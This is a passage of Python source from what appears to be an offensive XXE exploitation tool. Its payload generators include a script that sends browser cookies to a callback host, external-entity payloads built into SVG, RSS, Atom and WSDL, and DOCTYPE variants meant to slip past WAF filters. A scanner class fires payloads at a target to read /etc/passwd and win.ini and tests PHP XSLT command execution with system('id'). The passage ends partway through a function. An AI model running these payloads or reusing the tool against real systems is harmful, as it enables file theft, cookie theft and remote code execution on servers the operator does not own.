<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text x="10" y="20">XXE RCE Test</text>
<script type="text/javascript">
<![CDATA[
var img = new Image();
img.src = "{callback_url}/exfil?data=" + btoa(document.cookie);
]]>
</script>
</svg>'''
    
    @staticmethod
    def rss_xxe(callback_url: str) -> str:
        """RSS feed with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<rss version="2.0">
<channel>
<title>XXE RSS Feed</title>
<link>{callback_url}</link>
<description>Test</description>
<item>
<title>Test Item</title>
<description>&exfil;</description>
</item>
</channel>
</rss>'''
    
    @staticmethod
    def atom_xxe(callback_url: str) -> str:
        """Atom feed with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<feed xmlns="http://www.w3.org/2005/Atom">
<title>XXE Atom Feed</title>
<link href="{callback_url}"/>
<entry>
<title>Test</title>
<content>&exfil;</content>
</entry>
</feed>'''
    
    @staticmethod
    def wsdl_xxe(callback_url: str) -> str:
        """WSDL with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE definitions [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
<service name="XXEService">
<port name="XXEPort" binding="tns:XXEBinding">
<soap:address location="{callback_url}"/>
</port>
</service>
</definitions>'''

    # ------------------------------------------------------------------
    # Advanced discovery/enumeration payloads (v2.1)
    # ------------------------------------------------------------------

    # Known local DTD files whose parameter entities can be redefined for
    # the local-DTD error-based technique (GoSecure research). Existence of
    # any of these on the target also fingerprints the OS/software.
    LOCAL_DTD_CANDIDATES = [
        ('/usr/share/yelp/dtd/docbookx.dtd', 'ISOamso', 'Linux (GNOME yelp)'),
        ('/usr/share/xml/fontconfig/fonts.dtd', 'expr', 'Linux (fontconfig)'),
        ('/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd', 'url.attribute.set', 'Linux (scrollkeeper)'),
        ('/usr/share/xml/svg/svg10.dtd', 'SVG.ClipPath.extra.class', 'Linux (SVG DTD)'),
        ('/usr/share/php/PEAR/data/Symfony/Component/DependencyInjection/schema/dic/services/services-1.0.xsd', None, 'Linux (Symfony/PEAR)'),
        ('/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd', None, 'IBM WebSphere'),
        ('/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd', None, 'Java JSP API'),
        ('C:\\Windows\\System32\\wbem\\xml\\cim20.dtd', 'CIMName', 'Windows (WBEM)'),
    ]

    # URL schemes whose availability maps directly to exploitation options.
    PROTOCOL_PROBES = [
        ('file', 'file:///etc/hostname', 'local file read (Linux)'),
        ('file-win', 'file:///C:/Windows/win.ini', 'local file read (Windows)'),
        ('http', 'http://127.0.0.1:1/ghost', 'SSRF / OOB exfil'),
        ('ftp', 'ftp://127.0.0.1:1/ghost', 'OOB exfil incl. newlines (Java)'),
        ('php-filter', 'php://filter/convert.base64-encode/resource=/etc/hostname', 'binary-safe read (PHP)'),
        ('expect', 'expect://id', 'direct RCE (PHP expect module)'),
        ('jar', 'jar:http://127.0.0.1:1/!/ghost', 'file write via jar (Java)'),
        ('netdoc', 'netdoc:/etc/hostname', 'file read alias (legacy Java)'),
        ('gopher', 'gopher://127.0.0.1:1/_ghost', 'raw TCP SSRF (legacy Java)'),
        ('data', 'data://text/plain;base64,R0hPU1RfREFUQV9PSw==', 'entity smuggling (PHP)'),
    ]

    @staticmethod
    def scheme_probe(url: str) -> str:
        """Minimal external-entity payload for protocol support probing"""
        return f'''<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "{url}"> ]>
<r>&x;</r>'''

    @staticmethod
    def xxe_utf16_bytes(file_path: str, byte_order: str = 'le') -> bytes:
        """UTF-16 encoded XXE -- byte-level bypass for regex/WAF filters
        that scan for '<!DOCTYPE' in ASCII"""
        payload = (f'<?xml version="1.0" encoding="UTF-16"?>'
                   f'<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{file_path}"> ]>'
                   f'<r>&x;</r>')
        codec = 'utf-16-le' if byte_order == 'le' else 'utf-16-be'
        bom = b'\xff\xfe' if byte_order == 'le' else b'\xfe\xff'
        return bom + payload.encode(codec)

    @staticmethod
    def xxe_waf_bypass_variants(file_path: str) -> List[Tuple[str, str]]:
        """DOCTYPE mutations that dodge naive keyword/regex filters.
        Returns (variant_name, payload) tuples."""
        return [
            ('parameter_entity_indirection',
             f'''<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % p1 "<!ENTITY x SYSTEM 'file://{file_path}'>">
%p1;
]>
<r>&x;</r>'''),
            ('public_identifier',
             f'''<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x PUBLIC "ghost" "file://{file_path}"> ]>
<r>&x;</r>'''),
            ('whitespace_mutation',
             f'''<?xml version="1.0"?>
<!DOCTYPE\tr\t[\n<!ENTITY\tx\tSYSTEM\n"file://{file_path}"\t>\n]\t>
<r>&x;</r>'''),
            ('comment_split_subset',
             f'''<?xml version="1.0"?>
<!DOCTYPE r [ <!--ghost--> <!ENTITY x SYSTEM "file://{file_path}"> <!--ghost--> ]>
<r>&x;</r>'''),
            ('nested_entity_hop',
             f'''<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % a "file://">
<!ENTITY % p2 "<!ENTITY x SYSTEM '%a;{file_path}'>">
%p2;
]>
<r>&x;</r>'''),
            ('no_xml_declaration',
             f'''<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{file_path}"> ]><r>&x;</r>'''),
        ]

    @staticmethod
    def local_dtd_existence_probe(dtd_path: str) -> str:
        """Load a local DTD as a parameter entity -- response/error deltas
        vs. a known-missing control path reveal whether the file exists."""
        return f'''<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % d SYSTEM "file://{dtd_path}">
%d;
]>
<r>ghost</r>'''

    @staticmethod
    def local_dtd_exploit(dtd_path: str, entity_name: str, file_path: str) -> str:
        """Redefine a parameter entity inside an existing local DTD to get
        error-based file disclosure without any outbound connectivity."""
        return f'''<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % local_dtd SYSTEM "file://{dtd_path}">
<!ENTITY % {entity_name} '
<!ENTITY &#x25; file SYSTEM "file://{file_path}">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<r>ghost</r>'''

    @staticmethod
    def reflection_calibrator(marker: str) -> str:
        """Internal-entity payload used to locate where entity values land
        in the response, so file contents can be carved out precisely."""
        return f'''<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x "{marker}"> ]>
<r>&x;</r>'''


class XXEScanner:
    """Main XXE scanning and exploitation engine"""
    
    def __init__(self, args):
        self.target_url = args.url
        self.callback_url = args.callback
        self.callback_ip = args.callback_ip
        self.callback_port = args.callback_port or 8080
        self.method = args.method.upper()
        self.headers = self._parse_headers(args.headers)
        self.cookies = self._parse_cookies(args.cookies)
        self.param = args.param
        self.file_path = args.file
        self.timeout = args.timeout
        self.proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
        self.verbose = args.verbose
        self.harvest = getattr(args, 'harvest', False)
        self.enum_endpoints = getattr(args, 'enum_endpoints', False)
        self.loot_dir = getattr(args, 'loot_dir', './loot')
        self.session = requests.Session()
        self.vulnerabilities_found = []
        self.parser_fingerprint = None       # e.g. 'libxml2 (PHP)', 'Xerces (Java)'
        self.accepted_content_types = []     # content types the target parses
        self.supported_protocols = []        # URL schemes the parser resolves
        self.working_read_template = None    # confirmed file-read payload template
        self.reflection_bounds = None        # (prefix, suffix) around reflected entities
        self.harvested_loot = {}             # file_path -> content
        
    def _parse_headers(self, headers_str: str) -> Dict:
        """Parse custom headers"""
        headers = {}
        if headers_str:
            for header in headers_str.split(','):
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        return headers
    
    def _parse_cookies(self, cookies_str: str) -> Dict:
        """Parse cookies"""
        cookies = {}
        if cookies_str:
            for cookie in cookies_str.split(';'):
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def send_payload(self, payload, description: str = "",
                     content_type: str = None) -> Optional[requests.Response]:
        """Send XXE payload to target. Accepts str or raw bytes (for
        UTF-16/encoding-bypass payloads); content_type overrides the
        default application/xml when set."""
        try:
            if self.verbose:
                print(f"\n{Colors.INFO}[*] Testing: {description}{Colors.RESET}")
                if isinstance(payload, bytes):
                    print(f"{Colors.PAYLOAD}[*] Payload: <{len(payload)} raw bytes, "
                          f"starts {payload[:24]!r}>{Colors.RESET}")
                else:
                    print(f"{Colors.PAYLOAD}[*] Payload:\n{payload}{Colors.RESET}")

            headers = self.headers.copy()
            xml_content_type = content_type or 'application/xml'

            if self.method == 'GET':
                # GET request with XML in URL parameter
                headers['Content-Type'] = xml_content_type
                params = {self.param: payload} if self.param else {}
                
                if self.verbose and self.param:
                    # Show URL-encoded version
                    from urllib.parse import urlencode
                    encoded_params = urlencode(params)
                    full_url = f"{self.target_url}?{encoded_params}"
                    print(f"{Colors.INFO}[*] URL-Encoded GET Request:{Colors.RESET}")
                    print(f"{Colors.PAYLOAD}{full_url[:150]}{'...' if len(full_url) > 150 else ''}{Colors.RESET}")
                
                response = self.session.get(
                    self.target_url,
                    params=params,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False
                )
            elif 'multipart' in headers.get('Content-Type', '').lower() or self.param:
                # POST with multipart/form-data or specific parameter injection
                # Inject XML into the specified parameter
                if self.param:
                    # Inject XML payload into specific form field
                    form_data = {self.param: payload}
                    
                    if self.verbose:
                        print(f"{Colors.INFO}[*] Injecting XML into form parameter: {self.param}{Colors.RESET}")
                    
                    # Remove Content-Type to let requests set multipart boundary
                    if 'Content-Type' in headers:
                        del headers['Content-Type']
                    
                    response = self.session.post(
                        self.target_url,
                        data=form_data,
                        headers=headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        proxies=self.proxy,
                        verify=False
                    )
                else:
                    # No parameter specified, send as raw XML body
                    headers['Content-Type'] = xml_content_type
                    response = self.session.post(
                        self.target_url,
                        data=payload,
                        headers=headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        proxies=self.proxy,
                        verify=False
                    )
            else:  # POST with raw XML body
                headers['Content-Type'] = xml_content_type
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False
                )
            
            if self.verbose:
                print(f"{Colors.INFO}[*] Response Status: {response.status_code}{Colors.RESET}")
                print(f"{Colors.INFO}[*] Response Length: {len(response.text)}{Colors.RESET}")
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"{Colors.ERROR}[-] Request failed: {str(e)}{Colors.RESET}")
            return None
    
    def detect_xxe_basic(self) -> bool:
        """Detect basic XXE vulnerability with comprehensive payloads"""
        print(f"\n{Colors.HEADER}[*] Phase 2: Testing XXE File Read Exploitation{Colors.RESET}")
        
        test_files = [
            '/etc/passwd',
            '/etc/hostname',
            '/etc/hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini'
        ]
        
        for file_path in test_files:
            print(f"\n{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
            
            # Try multiple payload variations
            payload_methods = [
                ('Classic DTD', lambda f: PayloadGenerator.xxe_classic_file_read(f)),
                ('Standard XXE', lambda f: PayloadGenerator.xxe_basic_file_read(f)[0]),
                ('PHP Base64 Wrapper', lambda f: PayloadGenerator.xxe_php_wrapper_base64(f)),
                ('XInclude', lambda f: PayloadGenerator.xxe_xinclude_file_read(f)),
            ]
            
            for method_name, payload_func in payload_methods:
                try:
                    payload = payload_func(file_path)
                    
                    response = self.send_payload(
                        payload,
                        f"{method_name} - {file_path}"
                    )
                    
                    if response and self._check_xxe_response(response, file_path):
                        print(f"{Colors.SUCCESS}[+] XXE File Read Successful!{Colors.RESET}")
                        print(f"{Colors.SUCCESS}[+] Method: {method_name}{Colors.RESET}")
                        print(f"{Colors.SUCCESS}[+] File: {file_path}{Colors.RESET}")
                        print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
                        
                        # Check if base64 encoded
                        import re
                        if re.match(r'^[A-Za-z0-9+/]+=*$', response.text.strip()):
                            print(f"{Colors.WARNING}[*] Response appears to be base64 encoded{Colors.RESET}")
                            try:
                                import base64
                                decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                                print(decoded[:500])
                            except:
                                print(response.text[:500])
                        else:
                            print(response.text[:500])
                        
                        self.vulnerabilities_found.append({
                            'type': f'XXE File Read - {method_name}',
                            'payload': payload,
                            'file': file_path,
                            'method': method_name
                        })
                        return True
                        
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.ERROR}[-] {method_name} failed: {str(e)}{Colors.RESET}")
                    continue
        
        print(f"{Colors.WARNING}[-] XXE file read not successful with tested methods{Colors.RESET}")
        
        # If entity injection worked but file read didn't, provide guidance
        if any(v['type'] == 'XML Entity Injection - XXE Confirmed' for v in self.vulnerabilities_found):
            print(f"\n{Colors.INFO}[*] XXE CONFIRMED but direct file read blocked{Colors.RESET}")
            print(f"\n{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.HEADER}║          RECOMMENDED NEXT STEPS                            ║{Colors.RESET}")
            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}")
            print(f"\n{Colors.SUCCESS}[+] Entity substitution works - XXE is present!{Colors.RESET}")
            print(f"{Colors.INFO}[*] File read may be blocked by filters/restrictions{Colors.RESET}")
            
            print(f"\n{Colors.WARNING}→ Try These Techniques:{Colors.RESET}")
            print(f"\n1. {Colors.SUCCESS}PHP Base64 Wrapper{Colors.RESET} (bypass special characters)")
            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
            print(f"   <!DOCTYPE email [<!ENTITY xxe SYSTEM")
            print(f"     \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>")
            
            print(f"\n2. {Colors.SUCCESS}Out-of-Band (OOB) Exfiltration{Colors.RESET} (blind XXE)")
            print(f"   {Colors.INFO}Command:{Colors.RESET}")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     --oob --callback-ip YOUR_IP --callback-port 8080 -v")
            
            print(f"\n3. {Colors.SUCCESS}Try Different Files:{Colors.RESET}")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     -f /etc/hostname -v")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     -f index.php -v")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     -f config.php -v")
            
            print(f"\n4. {Colors.SUCCESS}Error-Based Exfiltration:{Colors.RESET}")
            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
            print(f"   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">")
            print(f"   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%xxe;'>\">")
            print(f"   %eval;%exfil;]>")
            
            print(f"\n5. {Colors.SUCCESS}Advanced Mode{Colors.RESET} (more techniques)")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     --advanced -v")
            
            print(f"\n6. {Colors.SUCCESS}Interactive Testing:{Colors.RESET}")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     --interactive")
            
            print(f"\n{Colors.WARNING}→ Manual Payload Testing:{Colors.RESET}")
            print(f"   Use Burp Suite to test custom payloads:")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"     --proxy http://127.0.0.1:8080 -v")
            
            print(f"\n{Colors.INFO}→ Common Reasons for Blocked File Read:{Colors.RESET}")
            print(f"   • PHP safe_mode or open_basedir restrictions")
            print(f"   • libxml LIBXML_NOENT disabled")
            print(f"   • File path restrictions/whitelist")
            print(f"   • XML parser blocks file:// protocol")
            print(f"   • Special characters breaking XML syntax")
            
            print(f"\n{Colors.SUCCESS}→ Recommended Attack Path:{Colors.RESET}")
            print(f"   1. Try PHP wrapper first (handles special chars)")
            print(f"   2. Test OOB if direct read fails")
            print(f"   3. Try error-based if OOB not possible")
            print(f"   4. Test different file paths")
            print(f"   5. Use interactive mode for custom payloads")
            print(f"\n{Colors.HEADER}{'═'*60}{Colors.RESET}\n")
        
        return False
    
    def detect_xxe_entity_injection(self) -> bool:
        """Test if XML entities are processed (precursor to XXE)"""
        print(f"\n{Colors.HEADER}[*] Phase 1: Testing XML Entity Processing{Colors.RESET}")
        
        # Test multiple unique values to ensure reflection
        test_values = [
            "GhostOpsTest123",
            "InlaneFreight",
            "XXE_VULN_TEST_2024"
        ]
        
        for test_value in test_values:
            # Create entity substitution payload
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ghosttest "{test_value}">
]>
<root>
<name>ghost</name>
<tel>1234567890</tel>
<email>&ghosttest;</email>
<message>test</message>
</root>'''
            
            response = self.send_payload(
                payload,
                f"Entity Substitution Test - {test_value}"
            )
            
            if response:
                # Analyze response
                analysis = self._analyze_response_reflection(response, test_value)
                
                if analysis['reflected']:
                    print(f"{Colors.SUCCESS}[+] CRITICAL: XML Entity Substitution Working!{Colors.RESET}")
                    print(f"{Colors.SUCCESS}[+] Entity value '{test_value}' was reflected in response{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Reflection points: {len(analysis['reflection_points'])}{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Response type: {analysis['reflection_type']}{Colors.RESET}")
                    print(f"\n{Colors.WARNING}[!] This confirms XXE vulnerability - proceeding to exploitation{Colors.RESET}")
                    
                    # Show response preview
                    print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
                    preview = response.text[:300]
                    # Highlight our test value
                    preview = preview.replace(test_value, f"{Colors.SUCCESS}{test_value}{Colors.RESET}")
                    print(preview)
                    
                    self.vulnerabilities_found.append({
                        'type': 'XML Entity Injection - XXE Confirmed',
                        'payload': payload,
                        'test_value': test_value,
                        'analysis': analysis
                    })
                    return True
        
        print(f"{Colors.WARNING}[-] XML entities not being processed{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target may not be vulnerable to XXE{Colors.RESET}")
        return False
    
    def _check_xxe_response(self, response: requests.Response, file_path: str = None, 
                           test_value: str = None) -> bool:
        """Check if response indicates successful XXE with improved detection"""
        response_text = response.text.lower()
        
        # File content indicators
        file_indicators = [
            'root:',  # /etc/passwd
            'localhost',  # /etc/hostname
            'for 16-bit app support',  # win.ini
            '[boot loader]',  # boot.ini
            '<?xml',
            'bin/bash',
            'nologin',
            '/bin/',
            '/usr/bin',
            'daemon:',
            'sys:',
            'nobody:',
            '[extensions]',  # win.ini
            'system32',  # Windows paths
            'program files',  # Windows paths
        ]
        
        # Check for file content
        if any(indicator.lower() in response_text for indicator in file_indicators):
            return True
        
        # Check if test value was reflected (entity substitution worked)
        if test_value and test_value.lower() in response_text:
            return True
        
        # Check for response length increase (might contain file content)
        if len(response.text) > 200:
            # Look for patterns that suggest file content
            if any(char in response.text for char in [':', '/', '\n']):
                # Contains path-like or multiline content
                return True
        
        # Check for base64-like content (encoded files)
        import re
        if re.search(r'[A-Za-z0-9+/]{50,}={0,2}', response.text):
            # Might be base64 encoded file
            return True
        
        return False
    
    def _analyze_response_reflection(self, response: requests.Response, 
                                    sent_value: str) -> dict:
        """Analyze where in the response our values are reflected"""
        analysis = {
            'reflected': False,
            'reflection_points': [],
            'reflection_type': None
        }
        
        if not response or not sent_value:
            return analysis
        
        # Check if value is reflected in response
        if sent_value in response.text:
            analysis['reflected'] = True
            
            # Find all occurrences
            import re
            occurrences = [m.start() for m in re.finditer(re.escape(sent_value), response.text)]
            analysis['reflection_points'] = occurrences
            
            # Determine reflection type
            if '<' in response.text and '>' in response.text:
                analysis['reflection_type'] = 'xml'
            elif '{' in response.text and '}' in response.text:
                analysis['reflection_type'] = 'json'
            else:
                analysis['reflection_type'] = 'text'
        
        return analysis
    
    def detect_xxe_error_based(self) -> bool:
        """Detect error-based blind XXE"""
        print(f"\n{Colors.HEADER}[*] Testing Error-Based XXE{Colors.RESET}")
        
        test_files = ['/etc/passwd', '/etc/hostname']
        
        for file_path in test_files:
            payload = PayloadGenerator.xxe_error_based(file_path)
            response = self.send_payload(payload, f"Error-based XXE - {file_path}")
            
            if response and ('parse error' in response.text.lower() or 
                           'xml' in response.text.lower() or
                           file_path in response.text):
                print(f"{Colors.SUCCESS}[+] Error-Based XXE Vulnerability Detected!{Colors.RESET}")
                print(f"{Colors.INFO}[*] Error message may contain file contents{Colors.RESET}")
                print(f"\n{Colors.INFO}[*] Response:{Colors.RESET}")
                print(response.text[:500])
                
                self.vulnerabilities_found.append({
                    'type': 'Error-Based XXE',
                    'payload': payload,
                    'file': file_path
                })
                return True
        
        print(f"{Colors.WARNING}[-] Error-based XXE not detected{Colors.RESET}")
        return False
    
    def detect_xxe_local_dtd(self) -> bool:
        """Detect local DTD-based XXE"""
        print(f"\n{Colors.HEADER}[*] Testing Local DTD XXE{Colors.RESET}")
        
        # Test Linux DTD
        linux_payload = PayloadGenerator.xxe_local_dtd_linux('/etc/passwd')
        response = self.send_payload(linux_payload, "Local DTD XXE - Linux")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] Local DTD XXE (Linux) Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'Local DTD XXE - Linux',
                'payload': linux_payload
            })
            return True
        
        # Test Windows DTD
        windows_payload = PayloadGenerator.xxe_local_dtd_windows('C:\\Windows\\win.ini')
        response = self.send_payload(windows_payload, "Local DTD XXE - Windows")
        
        if response and ('for 16-bit' in response.text.lower()):
            print(f"{Colors.SUCCESS}[+] Local DTD XXE (Windows) Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'Local DTD XXE - Windows',
                'payload': windows_payload
            })
            return True
        
        print(f"{Colors.WARNING}[-] Local DTD XXE not detected{Colors.RESET}")
        return False
    
    def detect_xinclude(self) -> bool:
        """Detect XInclude vulnerability"""
        print(f"\n{Colors.HEADER}[*] Testing XInclude XXE{Colors.RESET}")
        
        payload = PayloadGenerator.xinclude_attack()
        response = self.send_payload(payload, "XInclude XXE")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] XInclude XXE Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XInclude XXE',
                'payload': payload
            })
            return True
        
        print(f"{Colors.WARNING}[-] XInclude XXE not detected{Colors.RESET}")
        return False
    
    def test_xslt_injection(self) -> bool:
        """
        Test for XSLT injection vulnerabilities
        XSLT enables XML transformation and can be exploited for file read, RCE, SSRF
        Based on XSLT elements: template, value-of, for-each, if, sort
        """
        print(f"\n{Colors.HEADER}[*] Testing XSLT Injection{Colors.RESET}")
        print(f"{Colors.INFO}[*] XSLT can transform XML and execute functions{Colors.RESET}")
        
        vuln_found = False
        
        # Test 1: XSLT System Property Enumeration
        print(f"\n{Colors.INFO}[*] Test 1: XSLT System Property Enumeration{Colors.RESET}")
        sysinfo_payload = PayloadGenerator.xslt_system_property_enum()
        response = self.send_payload(sysinfo_payload, "XSLT System Properties")
        
        if response and ('version' in response.text or 'vendor' in response.text or '1.0' in response.text):
            print(f"{Colors.SUCCESS}[+] XSLT system properties accessible!{Colors.RESET}")
            if 'libxslt' in response.text.lower():
                print(f"{Colors.SUCCESS}[+] Processor: libxslt (PHP) - file read possible{Colors.RESET}")
            elif 'saxon' in response.text.lower():
                print(f"{Colors.SUCCESS}[+] Processor: Saxon (Java) - file read possible{Colors.RESET}")
            elif 'msxml' in response.text.lower():
                print(f"{Colors.SUCCESS}[+] Processor: MSXML (.NET) - RCE possible{Colors.RESET}")
            
            self.vulnerabilities_found.append({
                'type': 'XSLT System Info Disclosure',
                'payload': 'system-property enumeration'
            })
            vuln_found = True
        
        # Test 2: XSLT File Read with value-of
        print(f"\n{Colors.INFO}[*] Test 2: XSLT File Read (value-of){Colors.RESET}")
        file_read_payload = PayloadGenerator.xslt_file_read_value_of('/etc/hostname')
        response = self.send_payload(file_read_payload, "XSLT File Read value-of")
        
        if response and len(response.text) > 50:
            if self._check_xxe_response(response, '/etc/hostname'):
                print(f"{Colors.SUCCESS}[+] XSLT File Read via value-of successful!{Colors.RESET}")
                print(f"{Colors.INFO}[*] Response preview:{Colors.RESET}")
                print(response.text[:300])
                
                self.vulnerabilities_found.append({
                    'type': 'XSLT File Read (value-of)',
                    'payload': file_read_payload
                })
                vuln_found = True
        
        # Test 3: XSLT Embedded Stylesheet  
        print(f"\n{Colors.INFO}[*] Test 3: XSLT Embedded Stylesheet{Colors.RESET}")
        embedded_payload = PayloadGenerator.xslt_embedded_stylesheet('/etc/passwd')
        response = self.send_payload(embedded_payload, "XSLT Embedded")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] XSLT Embedded Stylesheet file read successful!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT File Read (Embedded)',
                'payload': embedded_payload
            })
            vuln_found = True
        
        # Test 4: XSLT with for-each
        print(f"\n{Colors.INFO}[*] Test 4: XSLT for-each Enumeration{Colors.RESET}")
        foreach_payload = PayloadGenerator.xslt_with_foreach_file_enum()
        response = self.send_payload(foreach_payload, "XSLT for-each")
        
        if response and ('entry' in response.text or 'results' in response.text):
            print(f"{Colors.SUCCESS}[+] XSLT for-each loops work!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT for-each Active',
                'payload': 'for-each enumeration'
            })
            vuln_found = True
        
        # Test 5: XSLT Conditional (if)
        print(f"\n{Colors.INFO}[*] Test 5: XSLT Conditional File Read{Colors.RESET}")
        conditional_payload = PayloadGenerator.xslt_conditional_file_read('/etc/hostname')
        response = self.send_payload(conditional_payload, "XSLT if condition")
        
        if response and 'found' in response.text:
            print(f"{Colors.SUCCESS}[+] XSLT if conditions work - file read possible!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT Conditional File Read',
                'payload': conditional_payload
            })
            vuln_found = True
        
        # Test 6: XSLT document() function with copy-of
        print(f"\n{Colors.INFO}[*] Test 6: XSLT document() with copy-of{Colors.RESET}")
        copyof_payload = PayloadGenerator.xslt_file_read()
        response = self.send_payload(copyof_payload, "XSLT copy-of")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] XSLT copy-of file read successful!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT File Read (copy-of)',
                'payload': copyof_payload
            })
            vuln_found = True
        
        # Test 7: PHP XSLT RCE
        print(f"\n{Colors.INFO}[*] Test 7: PHP XSLT RCE{Colors.RESET}")
        
        # First try direct element injection (works for GET parameters)
        if self.method == 'GET' and self.param:
            print(f"{Colors.INFO}[*] Testing direct PHP function injection (GET parameter mode){Colors.RESET}")
            
            # Test 7a: PHP RCE - system('id')
            rce_direct = '<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />'
            response = self.send_payload(rce_direct, "XSLT PHP RCE - system id")
            
            if response and ('uid=' in response.text or 'gid=' in response.text):
                print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP RCE CONFIRMED!{Colors.RESET}")
                print(f"{Colors.SUCCESS}[+] Command execution successful - system('id') works!{Colors.RESET}")
                print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
                # Extract and show the uid/gid output
                output_preview = response.text[max(0, response.text.find('uid=')-20):response.text.find('uid=')+150]
                print(output_preview)
                
                self.vulnerabilities_found.append({
                    'type': 'XSLT PHP RCE - CRITICAL',
                    'payload': rce_direct,
                    'result': 'Command execution confirmed'
                })
                vuln_found = True
            
            # Test 7b: PHP LFI - file_get_contents('/etc/passwd')
            if not vuln_found:  # Only test if RCE didn't work
                print(f"{Colors.INFO}[*] Testing PHP file_get_contents (LFI){Colors.RESET}")
                lfi_direct = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')" xmlns:php="http://php.net/xsl" />'
                response = self.send_payload(lfi_direct, "XSLT PHP LFI - /etc/passwd")
                
                if response and ('root:' in response.text or 'daemon:' in response.text or 'bin:' in response.text):
                    print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP LFI CONFIRMED!{Colors.RESET}")
                    print(f"{Colors.SUCCESS}[+] File read successful - file_get_contents() works!{Colors.RESET}")
                    print(f"\n{Colors.INFO}[*] File contents preview:{Colors.RESET}")
                    # Show first few lines of /etc/passwd
                    lines = response.text.split('\n')
                    for line in lines[:5]:
                        if 'root:' in line or ':x:' in line:
                            print(f"  {line[:80]}")
                    
                    self.vulnerabilities_found.append({
                        'type': 'XSLT PHP LFI - HIGH',
                        'payload': lfi_direct,
                        'result': 'File read confirmed - /etc/passwd'
                    })
                    vuln_found = True
            
            # Test 7c: PHP version detection
            if not vuln_found:
                print(f"{Colors.INFO}[*] Testing PHP version detection{Colors.RESET}")
